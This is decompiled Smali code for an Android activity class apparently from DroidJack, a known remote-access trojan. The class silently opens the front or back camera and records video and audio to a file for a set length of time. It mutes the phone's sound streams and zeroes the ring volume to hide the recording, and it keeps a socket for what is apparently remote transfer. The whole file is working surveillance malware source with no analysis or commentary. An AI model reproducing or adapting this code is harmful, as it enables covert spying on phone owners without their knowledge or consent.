.class public Lnet/droidjack/server/VideoCapDJ;
.super Landroid/app/Activity;

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# annotations
.annotation build Landroid/annotation/SuppressLint;
    value = {
        "NewApi"
    }
.end annotation


# static fields
.field public static a:Landroid/media/MediaRecorder;

.field private static b:Landroid/view/SurfaceHolder;

.field private static c:Landroid/view/SurfaceView;

.field private static d:Landroid/hardware/Camera;


# instance fields
.field private e:I

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;

.field private h:Ljava/net/Socket;

.field private i:Ljava/lang/Integer;

.field private j:Landroid/media/AudioManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/VideoCapDJ;)V
    .locals 0

    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->c()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/VideoCapDJ;Ljava/net/Socket;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/VideoCapDJ;->h:Ljava/net/Socket;

    return-void
.end method

.method private a(Z)V
    .locals 8

    const/4 v7, 0x4

    const/4 v6, 0x3

    const/4 v5, 0x2

    const/4 v4, 0x1

    const/4 v1, 0x0

    const-string v0, "audio"

    invoke-virtual {p0, v0}, Lnet/droidjack/server/VideoCapDJ;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    const/4 v2, 0x6

    new-array v2, v2, [I

    aput v7, v2, v1

    const/4 v3, 0x5

    aput v3, v2, v4

    aput v6, v2, v5

    aput v5, v2, v6

    aput v4, v2, v7

    array-length v3, v2

    :goto_0
    if-lt v1, v3, :cond_0

    return-void

    :cond_0
    aget v4, v2, v1

    invoke-virtual {v0, v4, p1}, Landroid/media/AudioManager;->setStreamMute(IZ)V

    add-int/lit8 v1, v1, 0x1

    goto :goto_0
.end method

.method static synthetic b(Lnet/droidjack/server/VideoCapDJ;)Ljava/net/Socket;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->h:Ljava/net/Socket;

    return-object v0
.end method

.method private c()V
    .locals 4

    const/4 v3, 0x0

    invoke-direct {p0, v3}, Lnet/droidjack/server/VideoCapDJ;->a(Z)V

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->j:Landroid/media/AudioManager;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->i:Ljava/lang/Integer;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->j:Landroid/media/AudioManager;

    const/4 v1, 0x2

    iget-object v2, p0, Lnet/droidjack/server/VideoCapDJ;->i:Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    invoke-virtual {v0, v1, v2, v3}, Landroid/media/AudioManager;->setStreamVolume(III)V

    :cond_0
    return-void
.end method

.method static synthetic c(Lnet/droidjack/server/VideoCapDJ;)V
    .locals 0

    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->d()V

    return-void
.end method

.method private d()V
    .locals 4

    const/4 v3, 0x2

    const/4 v2, 0x0

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "audio"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->j:Landroid/media/AudioManager;

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->j:Landroid/media/AudioManager;

    invoke-virtual {v0, v3}, Landroid/media/AudioManager;->getStreamVolume(I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    iput-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->i:Ljava/lang/Integer;

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->j:Landroid/media/AudioManager;

    invoke-virtual {v0, v3, v2, v2}, Landroid/media/AudioManager;->setStreamVolume(III)V

    return-void
.end method

.method private e()V
    .locals 1

    new-instance v0, Lnet/droidjack/server/cc;

    invoke-direct {v0, p0}, Lnet/droidjack/server/cc;-><init>(Lnet/droidjack/server/VideoCapDJ;)V

    invoke-virtual {v0}, Lnet/droidjack/server/cc;->start()V

    return-void
.end method

.method private f()V
    .locals 1

    :try_start_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->reset()V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    const/4 v0, 0x0

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->lock()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method private g()V
    .locals 1

    :try_start_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_0
.end method


# virtual methods
.method protected a()V
    .locals 6

    :try_start_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->unlock()V

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    sget-object v1, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setCamera(Landroid/hardware/Camera;)V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setVideoSource(I)V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    iget-object v1, p0, Lnet/droidjack/server/VideoCapDJ;->f:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->f:Ljava/lang/String;

    const-string v1, "Low"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_1

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x0

    invoke-static {v1}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V

    :cond_0
    :goto_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    sget-object v1, Lnet/droidjack/server/VideoCapDJ;->b:Landroid/view/SurfaceHolder;

    invoke-interface {v1}, Landroid/view/SurfaceHolder;->getSurface()Landroid/view/Surface;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setPreviewDisplay(Landroid/view/Surface;)V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    const-string v1, "video.3gp"

    invoke-virtual {p0, v1}, Lnet/droidjack/server/VideoCapDJ;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/ce;

    invoke-direct {v1, p0}, Lnet/droidjack/server/ce;-><init>(Lnet/droidjack/server/VideoCapDJ;)V

    iget-object v2, p0, Lnet/droidjack/server/VideoCapDJ;->g:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v2

    const-wide/16 v4, 0x3e8

    mul-long/2addr v2, v4

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :goto_1
    return-void

    :cond_1
    :try_start_2
    iget-object v0, p0, Lnet/droidjack/server/VideoCapDJ;->f:Ljava/lang/String;

    const-string v1, "High"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-static {v1}, Landroid/media/CamcorderProfile;->get(I)Landroid/media/CamcorderProfile;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setProfile(Landroid/media/CamcorderProfile;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    :catch_1
    move-exception v0

    goto :goto_1
.end method

.method protected b()V
    .locals 1

    :try_start_0
    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->d()V

    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->f()V

    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->g()V

    invoke-direct {p0}, Lnet/droidjack/server/VideoCapDJ;->e()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "videoview"

    const-string v2, "layout"

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Lnet/droidjack/server/VideoCapDJ;->setContentView(I)V

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    :try_start_0
    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "Camtype"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getIntent()Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    const-string v2, "Quality"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lnet/droidjack/server/VideoCapDJ;->f:Ljava/lang/String;

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getIntent()Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    const-string v2, "RecTime"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lnet/droidjack/server/VideoCapDJ;->g:Ljava/lang/String;

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v1, v0}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    iget-object v2, p0, Lnet/droidjack/server/VideoCapDJ;->f:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    iget-object v2, p0, Lnet/droidjack/server/VideoCapDJ;->g:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v1, "Front"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/4 v0, 0x1

    iput v0, p0, Lnet/droidjack/server/VideoCapDJ;->e:I

    :cond_0
    :goto_0
    iget v0, p0, Lnet/droidjack/server/VideoCapDJ;->e:I

    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const-string v1, "surface_camera"

    const-string v2, "id"

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, Lnet/droidjack/server/VideoCapDJ;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/view/SurfaceView;

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->c:Landroid/view/SurfaceView;

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->c:Landroid/view/SurfaceView;

    invoke-virtual {v0}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v0

    sput-object v0, Lnet/droidjack/server/VideoCapDJ;->b:Landroid/view/SurfaceHolder;

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Clear n working - Vid"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->b:Landroid/view/SurfaceHolder;

    invoke-interface {v0, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/cd;

    invoke-direct {v1, p0}, Lnet/droidjack/server/cd;-><init>(Lnet/droidjack/server/VideoCapDJ;)V

    const-wide/16 v2, 0x9c4

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    :goto_1
    return-void

    :cond_1
    const-string v1, "Back"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    iput v0, p0, Lnet/droidjack/server/VideoCapDJ;->e:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 2

    :try_start_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    sget-object v1, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->finish()V

    goto :goto_0
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 1

    :try_start_0
    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    sget-object v0, Lnet/droidjack/server/VideoCapDJ;->d:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {p0}, Lnet/droidjack/server/VideoCapDJ;->finish()V

    goto :goto_0
.end method
